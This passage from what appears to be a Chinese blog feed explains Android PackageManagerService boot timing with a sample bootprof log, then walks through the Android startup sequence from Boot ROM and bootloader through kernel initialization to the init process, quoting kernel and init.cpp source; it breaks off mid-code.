<p>比如将每个APK的receivers列表里的元素，通过mReceivers.addActivity(a, “receiver”)添加到PMS成员列表mReceivers中:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">final</span> ActivityIntentResolver mReceivers = <span class="keyword">new</span> ActivityIntentResolver();`</div></pre></td></tr></table></figure>
<p>由于实际解析函数太长，粗略看下有1000来行，读者有兴趣的可以自行研究。</p>
<h1 id="八、开机时间分析"><a href="#八、开机时间分析" class="headerlink" title="八、开机时间分析"></a>八、开机时间分析</h1><p>adb shell cat /proc/bootprof/<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"> C:\Users\shun&gt;adb shell cat /proc/bootprof</div><div class="line">----------------------------------------</div><div class="line">0           BOOT PROF (unit:msec)</div><div class="line">----------------------------------------</div><div class="line">      1655        : preloader</div><div class="line">      1001        : lk</div><div class="line">       493        : lk-&gt;Kernel</div><div class="line">----------------------------------------</div><div class="line">      5156.702307 : Kernel_init_done</div><div class="line">      5171.629538 : SElinux start.</div><div class="line">     10739.699692 : SElinux end.</div><div class="line">     11496.788538 : INIT: on init start</div><div class="line">     11878.325615 : INIT:eMMC:Mount_START</div><div class="line">     12777.653384 : INIT:eMMC:Mount_END</div><div class="line">     12780.874230 : INIT:PROTECT:Mount_START</div><div class="line">     12938.042615 : INIT:PROTECT:Mount_END</div><div class="line">     14029.370538 : INIT: eng build setting</div><div class="line">     15215.342538 : BOOT_Animation:START</div><div class="line">     16618.475076 : Zygote:Preload Start</div><div class="line">     20691.658230 : Zygote:Preload 2775 classes in 4062ms</div><div class="line">     23061.424153 : Zygote:Preload 274 obtain resources in 2334ms</div><div class="line">     23110.519076 : Zygote:Preload 31 resources in 47ms</div><div class="line">     23240.816000 : Zygote:Preload End</div><div class="line">     23720.832000 : Android:SysServerInit_START</div><div class="line">     24448.175153 : Android:PackageManagerService_Start</div><div class="line">     24747.363153 : Android:PMS_scan_START</div><div class="line">     24817.216000 : Android:PMS_scan_done:/custom/framework</div><div class="line">     24947.104384 : Android:PMS_scan_done:/system/framework</div><div class="line">     25131.265384 : Android:PMS_scan_done:/system/priv-app</div><div class="line">     25533.440461 : Android:PMS_scan_done:/system/app</div><div class="line">     25540.237769 : Android:PMS_scan_done:/system/vendor/app</div><div class="line">     25542.379538 : Android:PMS_scan_done:/system/vendor/operator/app</div><div class="line">     25544.285615 : Android:PMS_scan_done:/custom/app</div><div class="line">     25551.297076 : Android:PMS_scan_data_start</div><div class="line">     25967.971076 : Android:PMS_scan_data_done:/data/app</div><div class="line">     25969.811230 : Android:PMS_scan_data_done:/data/app-private</div><div class="line">     25971.862692 : Android:PMS_scan_END</div><div class="line">     26224.410076 : Android:PMS_READY</div><div class="line">     30108.635538 : AP_Init:[service]:[com.mediatek.security]:[com.mediatek.security/.service.PermControlService]:pid:738</div><div class="line">     30548.305692 : AP_Init:[broadcast]:[com.android.settings]:[com.android.settings/.widget.SettingsAppWidgetProvider]:pid:769</div><div class="line">     31341.380923 : AP_Init:[broadcast]:[com.mediatek.engineermode]:[com.mediatek.engineermode/.wifi.WifiStateReceiver]:pid:806</div><div class="line">     31563.917923 : AP_Init:[broadcast]:[com.tvguo.app]:[com.tvguo.app/.content.TvguoStateReceiver]:pid:829</div><div class="line">     31708.206000 : AP_Init:[service]:[com.android.systemui]:[com.android.systemui/.ImageWallpaper]:pid:847</div><div class="line">     31796.008076 : AP_Init:[service]:[com.android.inputmethod.latin]:[com.android.inputmethod.latin/.LatinIME]:pid:860</div><div class="line">     31987.434923 : AP_Init:[added application]:[com.mediatek.dongle]:[com.mediatek.dongle]:pid:878:(PersistAP)</div><div class="line">     32051.271692 : AP_Init:[added application]:[com.mediatek.bluetooth]:[com.mediatek.bluetooth]:pid:891:(PersistAP)</div><div class="line">     32142.389846 : AP_Init:[activity]:[com.android.launcher3]:[com.android.launcher3/.Launcher]:pid:906</div><div class="line">     32170.530846 : Android:SysServerInit_END</div><div class="line">     32309.788000 : AP_Init:[service]:[com.android.printspooler]:[com.android.printspooler/.PrintSpoolerService]:pid:923</div><div class="line">     33967.604076 : AP_Init:[broadcast]:[com.android.contacts]:[com.android.contacts/com.mediatek.contacts.simcontact.BootCmpReceiver]:pid:972</div><div class="line">     34752.970538 : AP_Init:[content provider]:[android.process.acore]:[com.android.providers.contacts/.ContactsProvider2]:pid:1028</div><div class="line">     35486.120000 : BOOT_Animation:END</div><div class="line">---------------------------------</div></pre></td></tr></table></figure></p>
<p>我们可以从上面的信息看到PMS在开机的时候做的动作和时间分布：（因为手上只有kk的平台，所以信息不太对应）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">24747.363153 : Android:PMS_scan_START</div><div class="line">24817.216000 : Android:PMS_scan_done:/custom/framework</div><div class="line">24947.104384 : Android:PMS_scan_done:/system/framework</div><div class="line">25131.265384 : Android:PMS_scan_done:/system/priv-app</div><div class="line">25533.440461 : Android:PMS_scan_done:/system/app</div><div class="line">25540.237769 : Android:PMS_scan_done:/system/vendor/app</div><div class="line">25542.379538 : Android:PMS_scan_done:/system/vendor/operator/app</div><div class="line">25544.285615 : Android:PMS_scan_done:/custom/app</div><div class="line">25551.297076 : Android:PMS_scan_data_start</div><div class="line">25967.971076 : Android:PMS_scan_data_done:/data/app</div><div class="line">25969.811230 : Android:PMS_scan_data_done:/data/app-private</div><div class="line">25971.862692 : Android:PMS_scan_END</div><div class="line">26224.410076 : Android:PMS_READY</div></pre></td></tr></table></figure>
<p>一般app装的越多，那么开机时间就会越长。</p>
<h1 id="九、附录"><a href="#九、附录" class="headerlink" title="九、附录"></a>九、附录</h1><ul>
<li><a href="/img/archives/packages.xml">packages.xml 文件 </a></li>
<li><a href="/img/archives/packages.list">packages.list 文件</a></li>
<li><a href="/img/archives/platform.xml">platform.xml 文件</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文介绍PackageManagerService启动流程。&lt;/p&gt;
    
    </summary>
    
      <category term="Android进阶" scheme="https://maoao530.github.io/categories/Android%E8%BF%9B%E9%98%B6/"/>
    
    
      <category term="PMS" scheme="https://maoao530.github.io/tags/PMS/"/>
    
      <category term="PackageManager" scheme="https://maoao530.github.io/tags/PackageManager/"/>
    
      <category term="PackageManagerService" scheme="https://maoao530.github.io/tags/PackageManagerService/"/>
    
  </entry>
  
  <entry>
    <title>Android系统启动流程</title>
    <link href="https://maoao530.github.io/2017/01/06/android-start/"/>
    <id>https://maoao530.github.io/2017/01/06/android-start/</id>
    <published>2017-01-06T13:29:35.000Z</published>
    <updated>2017-01-31T09:09:58.190Z</updated>
    
    <content type="html"><![CDATA[<p>本文介绍android的启动流程。</p>
<a id="more"></a>
<p>系统启动架构图：</p>
<p><img src="/img/archives/android-boot-up.png" alt="android-boot-up.png"></p>
<h1 id="一、Loader层"><a href="#一、Loader层" class="headerlink" title="一、Loader层"></a>一、Loader层</h1><p><strong>1. Boot ROM: </strong><br>上电后，BootRom会被激活，<code>引导芯片代码</code>开始从预定义的地方（固化在ROM）开始执行，然后加载引导程序到<code>RAM</code>。</p>
<p><strong>2. Boot Loader引导程序</strong><br>Boot Loader是启动Android系统之前的引导程序，引导程序是OEM厂商或者运营商加锁和限制的地方，它是针对特定的主板与芯片的。OEM厂商要么使用很受欢迎的引导程序比如<code>redboot</code>、<code>uboot</code>、<code>ARMboot</code>等或者开发自己的引导程序，它不是Android操作系统的一部分。<br>Boot Loader主要作用是检查RAM，初始化硬件参数等功能。</p>
<p><strong>3 Preloader: </strong><br>（1）Preloader是MTK平台独有的防止芯片被Hack的一个loader，MTK平台的bootrom会先加载preloader到SRAM中，preloader会先去初始化一些HW组件，比如通信端口(USB/Uart)，外部存储设备(Emmc or Nand)，内存设备(DRAM Calibration)等，最后会Load LK到DRAM中并且run LK(U-boot)。<br>（2）LK会从外部存储设备load boot image,包括Linux kernel和Ramdisk到DRAM中.最后LK会跳到 Linux Kernel里去执行start kernel.<br>（3）linux kernel会先完成一些初始化动作，mount 根文件系统和启动第一个用户进程(init 进程)</p>
<h1 id="二、kernel层"><a href="#二、kernel层" class="headerlink" title="二、kernel层"></a>二、kernel层</h1><p>Android内核与linux内核启动的方式差不多。Kernel的启动流程：</p>
<blockquote>
<p>alps/kernel/init/main.c<br><strong>start_kernel() ==&gt; rest_init() ==&gt; kernel_thread(kernel_init) ==&gt; kernel_init()</strong></p>
</blockquote>
<h2 id="2-1-rest-init"><a href="#2-1-rest-init" class="headerlink" title="2.1 rest_init()"></a>2.1 rest_init()</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> noinline <span class="keyword">void</span> __<span class="function">ref <span class="title">rest_init</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">    ...</div><div class="line">    kernel_thread(kernel_init, <span class="literal">NULL</span>, CLONE_FS);</div><div class="line">    pid = kernel_thread(kthreadd, <span class="literal">NULL</span>, CLONE_FS | CLONE_FILES);</div><div class="line">    ...</div><div class="line">    init_idle_bootup_task(current);</div><div class="line">    schedule_preempt_disabled();</div><div class="line">    ...</div><div class="line">    cpu_idle();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ol>
<li>rest_init中调用kernel_thread函数启动了2个内核线程，分别是：kernel_init和kthreadd</li>
<li>调用schedule函数开启了内核的调度系统，从此linux系统开始转起来了。</li>
<li>rest_init最终调用cpu_idle函数结束了整个内核的启动。<br>也就是说linux内核最终结束了一个函数cpu_idle。这个函数里面肯定是死循环。</li>
<li>简单来说，linux内核最终的状态是：<strong>有事干的时候去执行有意义的工作（执行各个进程任务），实在没活干的时候就去死循环（实际上死循环也可以看成是一个任务）。</strong></li>
<li>之前已经启动了内核调度系统，调度系统会负责考评系统中所有的进程，这些进程里面只有有哪个需要被运行，调度系统就会终止cpu_idle死循环进程（空闲进程）转而去执行有意义的干活的进程。这样操作系统就转起来了。</li>
</ol>
<p><strong> 0号进程：</strong><br>swapper进程(pid=0)：又称为idle进程, 叫空闲进程，由系统自动创建, 运行在内核态。<br>系统初始化过程Kernel由无到有开创的第一个进程, 也是唯一一个没有通过fork或者kernel_thread产生的进程。<br>swapper进程用于初始化进程管理、内存管理，加载Display,Camera Driver，Binder Driver等相关工作。</p>
<p><strong> 1号进程 </strong><br>init进程(pid=1)：由0号进程通过kernel_thread创建，在内核空间完成初始化后, 加载init程序, 并最终运行在用户空间，<code>init进程是所有用户进程的鼻祖</code>。</p>
<p><strong> 2号进程 </strong><br>kthreadd进程(pid=2)：由0号进程通过kernel_thread创建，是Linux系统的内核进程，会创建内核工作线程kworkder，软中断线程ksoftirqd，thermal等内核守护进程。<br>kthreadd运行在内核空间, 负责所有内核线程的调度和管理 , <code>kthreadd进程是所有内核进程的鼻祖</code>。</p>
<h2 id="2-2-kernel-init"><a href="#2-2-kernel-init" class="headerlink" title="2.2 kernel_init()"></a>2.2 kernel_init()</h2><p>init进程会通过kernel_init创建，这个时候是在内核态，那么怎么一步步走到用户态呢？</p>
<blockquote>
<p>kernel_init-&gt;init_post-&gt;run_init_process-&gt;kernel_execve</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> <span class="keyword">int</span> __<span class="function">init <span class="title">kernel_init</span><span class="params">(<span class="keyword">void</span> * unused)</span>  </span></div><div class="line">&#123;  </div><div class="line">    <span class="comment">/*Wait until kthreadd is all set-up.*/</span>  </div><div class="line">    wait_for_completion(&amp;kthreadd_done);  </div><div class="line">     </div><div class="line">    <span class="comment">//主要是初始化设备驱动，完成其他驱动程序（直接编译进内核的模块）的初始化。</span></div><div class="line">    do_basic_setup();  </div><div class="line"></div><div class="line">    <span class="comment">//挂载根文件系统</span></div><div class="line">    <span class="keyword">if</span> (sys_open((<span class="keyword">const</span> <span class="keyword">char</span> __user *) <span class="string">"/dev/console"</span>, O_RDWR, <span class="number">0</span>) &lt; <span class="number">0</span>)  </div><div class="line">        printk(KERN_WARNING <span class="string">"Warning: unable to open an initial console.\n"</span>); </div><div class="line"></div><div class="line">    <span class="comment">//定义init进程 </span></div><div class="line">    <span class="keyword">if</span> (!ramdisk_execute_command)  </div><div class="line">        ramdisk_execute_command = <span class="string">"/init"</span>;  </div><div class="line"></div><div class="line">    <span class="comment">//最后调用init_post，启动进程负责用户空间的初始化 </span></div><div class="line">    init_post();  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>接下来定位到<code>init_post</code>的函数体，代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> noinline <span class="keyword">int</span> <span class="title">init_post</span><span class="params">(<span class="keyword">void</span>)</span>  </span></div><div class="line">&#123;  </div><div class="line">    ……<span class="comment">//省略部分代码  </span></div><div class="line">    <span class="keyword">if</span> (ramdisk_execute_command) &#123;  </div><div class="line">    <span class="comment">//run_init_process执行后将不再返回  </span></div><div class="line">    run_init_process(ramdisk_execute_command);  </div><div class="line">    &#125;  </div><div class="line">    <span class="keyword">if</span> (execute_command) &#123;  </div><div class="line">       run_init_process(execute_command);  </div><div class="line">    &#125;  </div><div class="line">    run_init_process(<span class="string">"/sbin/init"</span>);  </div><div class="line">    run_init_process(<span class="string">"/etc/init"</span>);  </div><div class="line">    run_init_process(<span class="string">"/bin/init"</span>);  </div><div class="line">    run_init_process(<span class="string">"/bin/sh"</span>);  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>execute_command 是bootloader传递给内核的参数，一般是/init（即根目录下的init程序），也就是调用文件系统里的init进程。如果找不到就会继续寻找“/sbin/init”、“/etc/init”、“/bin/init”、“/bin/sh”，找到后便执行run_init_process，且不再返回。run_init_process的函数体非常简单，仅仅是对kernel_execve函数的封装，代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">run_init_process</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *init_filename)</span>  </span></div><div class="line">&#123;  </div><div class="line">  argv_init[<span class="number">0</span>] = init_filename;  </div><div class="line">  kernel_execve(init_filename, argv_init, envp_init);  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>kernel_execve</code>是Linux内核中创建用户进程的方法接口，其实现位于</p>
<blockquote>
<p>arch/arm/kernel/sys_arm.c。</p>
</blockquote>
<p>那么至此，我们已经对Android Kernel如何引导以及用户空间1号进程（init进程）如何启动做了详细分析。</p>
<h1 id="三、Init进程"><a href="#三、Init进程" class="headerlink" title="三、Init进程"></a>三、Init进程</h1><h2 id="3-1-Init-Process"><a href="#3-1-Init-Process" class="headerlink" title="3.1 Init Process"></a>3.1 Init Process</h2><p>这里的Native层主要说明init进程，当kernel Initialize完成之后，系统会执行第一个用户进程init<br>，我们可以说它是root进程或者所有进程的父进程。init进程相关的代码：</p>
<blockquote>
<p>/system/core/init/init.cpp：<br>/system/core/rootdir/init.rc<br>/system/core/init/readme.txt</p>
</blockquote>
<p>Init进程启动过程就是代码init.cpp中main函数执行过程，我们来看看它做了什么：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(basename(argv[<span class="number">0</span>]), <span class="string">"ueventd"</span>)) &#123;</div><div class="line">        <span class="keyword">return</span> ueventd_main(argc, argv);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(basename(argv[<span class="number">0</span>]), <span class="string">"watchdogd"</span>)) &#123;</div><div class="line">        <span class="keyword">return</span> watchdogd_main(argc, argv);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// Clear the umask.</span></div><div class="line">    umask(<span class="number">0</span>);</div><div class="line"></div><div class="line">    add_environment(<span class="string">"PATH"</span>, _PATH_DEFPATH);</div><div class="line"></div><div class="line">    <span class="keyword">bool</span> is_first_stage = (argc == <span class="number">1</span>) || (<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">"--second-stage"</span>) != <span class="number">0</span>);</div><div class="line"></div><div class="line">    <span class="comment">//挂载tmpfs, devpts, proc, sysfs文件系统</span></div><div class="line">    <span class="keyword">if</span> (is_first_stage) &#123;</div><div class="line">        mount(<span class="string">"tmpfs"</span>, <span class="string">"/dev"</span>, <span class="string">"tmpfs"</span>, MS_NOSUID, <span class="string">"mode=0755"</span>);</div><div class="line">        mkdir(<span class="string">"/dev/pts"</span>, <span class="number">0755</span>);</div><div class="line">        mkdir(<span class="string">"/dev/socket"</span>, <span class="number">0755</span>);</div><div class="line">        mount(<span class="string">"devpts"</span>, <span class="string">"/dev/pts"</span>, <span class="string">"devpts"</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</div><div class="line">        <span class="meta">#<span class="meta-keyword">define</span> MAKE_STR(x) __STRING(x)</span></div><div class="line">        mount(<span class="string">"proc"</span>, <span class="string">"/proc"</span>, <span class="string">"proc"</span>, <span class="number">0</span>, <span class="string">"hidepid=2,gid="</span> MAKE_STR(AID_READPROC));</div><div class="line">        mount(<span class="string">"sysfs"</span>, <span class="string">"/sys"</span>, <span class="string">"sysfs"</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// We must have some place other than / to create the device nodes for</span></div><div class="line">    <span class="comment">// kmsg and null, otherwise we won't be able to remount / read-only</span></div><div class="line">    <span class="comment">// later on. Now that tmpfs is mounted on /dev, we can actually talk</span></div><div class="line">    <span class="comment">// to the outside world.</span></div><div class="line">    <span class="comment">//屏蔽标准的输入输出，即标准的输入输出定向到NULL设备。  </span></div><div class="line">    open_devnull_stdio();</div><div class="line">    <span class="comment">//kernel log初始化</span></div><div class="line">    klog_init();</div><div class="line">    klog_set_level(KLOG_NOTICE_LEVEL);</div><div class="line"></div><div class="line">    NOTICE(<span class="string">"init %s started!\n"</span>, is_first_stage ? <span class="string">"first stage"</span> : <span class="string">"second stage"</span>);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (!is_first_stage) &#123;</div><div class="line">        <span class="comment">// Indicate that booting is in progress to background fw loaders, etc.</span></div><div class="line">        close(open(<span class="string">"/dev/.booting"</span>, O_WRONLY | O_CREAT | O_CLOEXEC, <span class="number">0000</span>));</div><div class="line">        <span class="comment">//创建一块共享的内存空间，用于属性服务</span></div><div class="line">        property_init();</div><div class="line"></div><div class="line">        <span class="comment">// If arguments are passed both on the command line and in DT,</span></div><div class="line">        <span class="comment">// properties set in DT always have priority over the command-line ones.</span></div><div class="line">        <span class="comment">//设置基本属性 </span></div><div class="line">        process_kernel_dt();</div><div class="line">        process_kernel_cmdline();</div><div class="line"></div><div class="line">        <span class="comment">// Propagate the kernel variables to internal variables</span></div><div class="line">        <span class="comment">// used by init as well as the current required properties.</span></div><div class="line">        export_kernel_boot_props();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// Set up SELinux, including loading the SELinux policy if we're in the kernel domain.</span></div><div class="line">    <span class="comment">// 加载SELinux</span></div><div class="line">    selinux_initialize(is_first_stage);</div><div class="line"></div><div class="line">    <span class="comment">// If we're in the kernel domain, re-exec init to transition to the init domain now</span></div><div class="line">    <span class="comment">// that the SELinux policy has been loaded.</span></div><div class="line">    <span class="keyword">if</span> (is_first_stage) &#123;</div><div class="line">        <span class="keyword">if</span> (restorecon(<span class="string">"/init"</span>) == <span class="number">-1</span>) &#123;</div><div class="line">            ERROR(<span class="string">"restorecon failed: %s\n"</span>, strerror(errno));</div><div class="line">            security_failure();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">char</span>* path = argv[<span class="number">0</span>];</div><div class="line">        <span class="keyword">char</span>* args[] = &#123; path, <span class="keyword">const_cast</span>&lt;<span class="keyword">char</span>*&gt;(<span class="string">"--second-stage"</span>), <span class="literal">nullptr</span> &#125;;</div><div class="line">        <span class="keyword">if</span> (execv(path, args) == <span class="number">-1</span>) &#123;</div><div class="line">            ERROR(<span class="string">"execv(\"%s\") failed: %s\n"</span>, path, strerror(errno));</div><div class="line">            security_failure();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// These directories were necessarily created before initial policy load</span></div><div class="line">    <span class="comment">// and therefore need their security context restored to the proper value.</span></div><div class="line">    <span class="comment">// This must happen before /dev is populated by ueventd.</span></div><div class="line">    NOTICE(<span class="string">"Running restorecon...\n"</span>);</div><div class="line">    restorecon(<span class="string">"/dev"</span>);</div><div class="line">    restorecon(<span class="string">"/dev/socket"</span>);</div><div class="line">    restorecon(<span class="string">"/dev/__properties__"</span>);</div><div class="line">    restorecon(<span class="string">"/property_contexts"</span>);</div><div class="line">    restorecon_recursive(<span class="string">"/sys"</span>);</div><div class="line"></div><div class="line">    epoll_fd = epoll_create1(EPOLL_CLOEXEC);</div><div class="line">    <span class="keyword">if</span> (epoll_fd == <span class="number">-1</span>) &#123;</div><div class="line">        ERROR(<span class="string">"epoll_create1 failed: %s\n"</span>, strerror(errno));</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="comment">//初始化子进程退出的信号处理过程</span></div><div class="line">    signal_handler_init();</div><div class="line">    <span class="comment">//加载/default.prop文件</span></div><div class="line">    property_load_boot_defaults();</div><div class="line">    export_oem_lock_status();</div><div class="line">    <span class="comment">//启动属性服务</span></div><div class="line">    start_property_service();</div><div class="line"></div><div class="line">    <span class="keyword">const</span> BuiltinFunctionMap function_map;</div><div class="line">    Action::set_function_map(&amp;function_map);</div><div class="line"></div><div class="line">    <span class="comment">// 添加解service, on, import 解析器</span></div><div class="line">    Parser&amp; parser = Parser::GetInstance();</div><div class="line">    parser.AddSectionParser(<span class="string">"service"</span>,<span class="built_in">std</span>::make_unique&lt;ServiceParser&gt;());</div><div class="line">    parser.AddSectionParser(<span class="string">"on"</span>, <span class="built_in">std</span>::make_unique&lt;ActionParser&gt;());</div><div class="line">    parser.AddSectionParser(<span class="string">"import"</span>, <span class="built_in">std</span>::make_unique&lt;ImportParser&gt;());</div><div class="line">    <span class="comment">// 解析init rc文件</span></div><div class="line">    parser.ParseConfig(<span class="string">"/init.rc"</span>);</div><div class="line"></div><div class="line">    ActionManager&amp; am = ActionManager::GetInstance();</div><div class="line"></div><div class="line">    <span class="comment">//执行rc文件中触发器为 on early-init的语句</span></div><div class="line">    am.QueueEventTrigger(<span class="string">"early-init"</span>);</div><div class="line">    <span class="comment">//创建wait_for_coldboot_done 动作并添加到action vector和trigger_queue_中</span></div><div class="line">    am.QueueBuiltinAction(wait_for_coldboot_done_action, <span class="string">"wait_for_coldboot_done"</span>);</div><div class="line">    am.QueueBuiltinAction(mix_hwrng_into_linux_rng_action, <span class="string">"mix_hwrng_into_linux_rng"</span>);</div><div class="line">    am.QueueBuiltinAction(set_mmap_rnd_bits_action, <span class="string">"set_mmap_rnd_bits"</span>);</div><div class="line">    am.QueueBuiltinAction(keychord_init_action, <span class="string">"keychord_init"</span>);</div><div class="line">    am.QueueBuiltinAction(console_init_action, <span class="string">"console_init"</span>);</div><div class="line"></div><div class="line">    <span class="comment">//执行rc文件中触发器为 on init的语句</span></div><div class="line">    <span class="comment">// Trigger all the boot actions to get us started.</span></div><div class="line">    am.QueueEventTrigger(<span class="string">"init"</span>);</div><div class="line"></div><div class="line">    <span class="comment">// Repeat mix_hwrng_into_linux_rng in case /dev/hw_random or /dev/random</span></div><div class="line">    <span class="comment">// wasn't ready immediately after wait_for_coldboot_done</span></div><div class="line">    am.QueueBuiltinAction(mix_hwrng_into_linux_rng_action, <span class="string">"mix_hwrng_into_linux_rng"</span>);</div><div class="line"></div><div class="line">    <span class="comment">// Don't mount filesystems or start core system services in charger mode.</span></div><div class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> bootmode = property_get(<span class="string">"ro.bootmode"</span>);</div><div class="line">    <span class="keyword">if</span> (bootmode == <span class="string">"charger"</span>) &#123;</div><div class="line">        <span class="comment">//充电模式下，执行rc文件中触发器为charger的语句</span></div><div class="line">        am.QueueEventTrigger(<span class="string">"charger"</span>);</div><div 